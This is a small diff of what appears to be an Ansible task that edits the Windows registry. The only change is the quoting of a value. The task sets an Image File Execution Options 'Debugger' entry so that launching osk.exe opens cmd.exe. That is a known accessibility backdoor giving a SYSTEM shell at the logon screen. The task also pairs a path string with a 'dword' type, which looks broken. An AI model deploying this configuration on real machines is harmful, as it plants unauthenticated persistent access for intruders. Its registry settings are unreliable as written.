@@ -10,6 +10,6 @@
             win_regedit:
               path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe
               name: Debugger
-              data: C:\windows\system32\cmd.exe
+              data: 'C:\windows\system32\cmd.exe'
               type: dword
             
